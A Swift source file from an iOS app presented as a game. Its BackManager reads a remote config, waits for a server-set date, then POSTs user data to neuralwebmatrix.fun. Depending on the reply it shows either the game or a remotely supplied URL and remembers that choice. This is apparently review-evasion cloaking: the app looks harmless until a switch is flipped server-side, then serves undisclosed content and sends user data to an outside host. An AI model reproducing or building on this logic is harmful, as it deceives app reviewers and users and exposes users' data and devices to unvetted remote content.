//
//  BackManager.swift
//  Game1
//
//  Created by Александр Андреев on 10.08.2024.
//

import Foundation
import UIKit
protocol InitialViewDelegate: AnyObject {
    func setupZeroView()
    func setupInitialView()
    func setupLinkWithTimeout(urlRemoteConfig: String)
}

final class BackManager {
    
    //MARK: - Properties
    weak var sceneDelegate: InitialViewDelegate?

    var urlRemoteConfig = "https://www.google.com"
    var lastDate: Date! // remote config
    var jsonResponse: [String: Any] = [:]
    var isBlock: Bool! // remote config
    var isResetUrlLink: Int? // remote config
    
    //MARK: - Initialize
    init() {
        configure()
    }
    
    //MARK: - Methods
    private func configure() {
        setupRemoteConfig {
            if self.lastDate <= Date() {
                print("BackManager:   lastDate has expired")
                let hasNoParentSaved = UserDefaults.standard.integer(forKey: "hasNoParent")
            
                if hasNoParentSaved == 0 {
                    print("BackManager:   'has_no_parent' was saved and equal to 0")
                    DispatchQueue.main.async {
                        self.setupUI(hasNoParent: 0)
                    }
                } else {
                    //POST
                    print("BackManager:   'has_no_parent' wasn't saved or equal to 1")
                    print("BackManager:   POST request")
                    self.getHasNoParent { hasNoParent in
                        DispatchQueue.main.async {
                            if let hasNoParent = hasNoParent {
                                print("BackManager:   Success to get value 'has_no_parent'")
                                self.setupUI(hasNoParent: hasNoParent)
                            } else {
                                print("BackManager:   Failed to get value 'has_no_parent'")
                                print("BackManager:   isBlock == \(String(describing: self.isBlock))")
                                // Получаем значение параметра "isDead" от Remote Config и если выставлено значение "False" - выдаем 1, иначе если "True" - выдаем 0.
                                if self.isBlock == false {
                                    self.setupUI(hasNoParent: 1)
                                } else {
                                    self.setupUI(hasNoParent: 0)
                                }
                                
                            }
                        }
                        
                    }
                }
            } else {
                print("BackManager:   lastDate > current ")
                DispatchQueue.main.async {
                    self.setupLoadingView()
                }
            }
        }

        
    }
    
    private func setupUI(hasNoParent: Int) {
        if hasNoParent == 1 {
            setupLoadingView()
        } else {
            //в первый ли раз заходим
            UserDefaults.standard.set(hasNoParent, forKey: "hasNoParent")
            print("BackManager:   'has_no_parent' was saved")
            let isNotFirstTime = UserDefaults.standard.bool(forKey: "isNotFirstTime")
            print(isNotFirstTime)
            if isNotFirstTime {
                print("BackManager: is not first lounching")
                if let isReset = isResetUrlLink {
                    if isReset == 1 {
                        //запускать страховку?
                        print("BackManager:   Resetting URL")
                        UserDefaults.standard.set(urlRemoteConfig, forKey: "savedURL")
                    }
                }
                setupZeroView()
            } else {
                openLinkWithTimeout()
            }
        }
    }
    
    //MARK: - InitialViewDelegate
    private func setupZeroView() {
        print("BackManager:   Lounching ZeroViewController")
        sceneDelegate?.setupZeroView()
    }
    
    private func setupLoadingView() {
        print("BackManager:   Lounching MainViewController")
        sceneDelegate?.setupInitialView()
    }
    
    private func openLinkWithTimeout() {
        print("BackManager:   Lounching ZeroViewController with timeout")
        sceneDelegate?.setupLinkWithTimeout(urlRemoteConfig: urlRemoteConfig)
    }
    
    //MARK: - Remote Config
    private func setupRemoteConfig(completion: @escaping () -> Void) {
        let urlString = "https://appstorage.org/api/conf/cr4zybubbl3t1m3qu3st"
        NetworkManager.shared.performGetRequest(urlString: urlString) { [self] result in
            switch result {
            case .success(let json):
                if let jsonDict = json as? [String: Any] {
                    print("BackManager:   Success to get data URL \(jsonDict)")
                    self.jsonResponse = jsonDict
                    setupDate()
                    setupURL()
                    setupIsResetUrlLink()
                    setupIsBlock()
                }
                
            case .failure(let error):
                print("BackManager:   \(error.localizedDescription)")
            }
            // Переход на главный поток перед выполнением completion и UI-операций
            DispatchQueue.main.async {
                completion()
            }
        }
        
    }
    
    //MARK: - Remote Config properties
    private func setupIsBlock() {
        self.isBlock = jsonResponse["isBlock"] as? Bool
        print("BackManager:  isBlock: \(String(describing: self.isBlock))")
    }
    
    private func setupURL() {
        self.urlRemoteConfig = jsonResponse["urlLink"] as! String
        print("BackManager:  urlLink: \(self.urlRemoteConfig)")
    }
    
    private func setupIsResetUrlLink() {
        self.isResetUrlLink = Int(jsonResponse["isResetUrlLink"] as! String) ?? 0
        print("BackManager:  urlLink: \(String(describing: self.isResetUrlLink))")
    }
    
    private func setupDate() {
        // Извлекаем значение "date" из JSON
        print(jsonResponse)
        let dateString = jsonResponse["date"] as! String
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        
        // Преобразуем строку в объект Date
        let date = dateFormatter.date(from: dateString)
        self.lastDate = date
    }
    
    //MARK: - One/Zero
    private func getHasNoParent(completion: @escaping (Int?) -> Void) {
        guard let url = URL(string: "https://neuralwebmatrix.fun/app/cr4zybubbl3t1m3qu3st") else {
            completion(nil)
            return
        }
        
        guard let data = JSONCreator.shared.createUserData() else {
            completion(nil)
            return
        }
        
        let dispatchGroup = DispatchGroup()
        var jsonResponse: [String: Any]?
        var requestError: Error?
        var timeoutReached = false
        
        dispatchGroup.enter()
        
        // Выполняем запрос
        NetworkManager.shared.sendPostRequest(urlString: url.absoluteString, jsonData: data) { result in
            switch result {
            case .success(let json):
                jsonResponse = json
            case .failure(let error):
                requestError = error
            }
            
            dispatchGroup.leave()
        }
        print("BackManager:   Start time interval(7)")
        let timeoutInterval: TimeInterval = 7
        DispatchQueue.global().asyncAfter(deadline: .now() + timeoutInterval) {
            timeoutReached = true
//            dispatchGroup.leave()
        }
        
        // Ожидаем завершения запросов и таймера
        dispatchGroup.notify(queue: .main) {
            if timeoutReached {
                // Тайм-аут
                if let error = requestError {
                    print("BackManager: \(error.localizedDescription)")
                } else {
                    print("BackManager: Time out!")
                    completion(nil)
                }
            } else {
                // Запрос завершился раньше тайм-аута
                if let json = jsonResponse, let hasNoParent = json["has_no_parent"] as? Int {
                    completion(hasNoParent)
                } else {
                    completion(nil)
                }
            }
        }
    }
    
    
}
